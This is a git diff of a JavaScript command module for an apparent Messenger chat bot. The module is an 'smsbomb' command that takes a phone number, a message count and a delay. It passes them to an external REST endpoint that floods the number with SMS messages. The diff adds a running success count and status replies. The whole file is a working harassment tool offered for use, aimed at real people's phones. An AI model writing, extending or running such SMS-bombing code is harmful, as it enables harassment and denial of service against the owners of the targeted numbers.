@@ -1,4 +1,5 @@
 const axios = require('axios');
+let successCount = 0;
 
 module.exports.config = {
     name: 'smsbomb',
@@ -6,9 +7,9 @@ module.exports.config = {
     role: 0,
     hasPrefix: true,
     aliases: ['smsbomb'],
-    description: "Start SMS bombing",
-    usage: "smsbomb [phone] [amount] [cooldown]",
-    credits: 'churchill',
+    description: "sms spammer",
+    usage: "[phone] [amount] [cooldown]",
+    credits: 'taichi/jenard', //wag niyo tanggalin!!!
 };
 
 module.exports.run = async function ({ api, event, args }) {
@@ -18,18 +19,30 @@ module.exports.run = async function ({ api, event, args }) {
         return api.sendMessage('Please provide a phone number, amount, and cooldown period.', event.threadID, event.messageID);
     }
 
-    try {
-        const response = await axios.get(`https://deku-rest-api-ywad.onrender.com/smsb`, {
-            params: {
-                number: phone,
-                amount: amount,
-                delay: cooldown
-            }
-        });
+    api.sendMessage('Processing SMS bombing...', event.threadID, async (err, info) => {
+        if (err) {
+            console.error('Error processing SMS bombing:', err);
+            return;
+        }
 
-        api.sendMessage('SMS bombing started!', event.threadID, event.messageID);
-    } catch (error) {
-        console.error('Error starting SMS bombing:', error);
-        api.sendMessage('Error starting SMS bombing.', event.threadID, event.messageID);
-    }
+        try {
+            const response = await axios.get(`https://deku-rest-api-ywad.onrender.com/smsb`, {
+                params: {
+                    number: phone,
+                    amount: amount,
+                    delay: cooldown
+                }
+            });
+
+            if (response.data.success) {
+                successCount += parseInt(amount);
+                api.sendMessage(`${successCount} success sent`, event.threadID, event.messageID);
+            } else {
+                api.sendMessage('Failed to start SMS bombing. Please try again later.', event.threadID, event.messageID);
+            }
+        } catch (error) {
+            console.error('Error starting SMS bombing:', error);
+            api.sendMessage('Error starting SMS bombing.', event.threadID, event.messageID);
+        }
+    });
 };
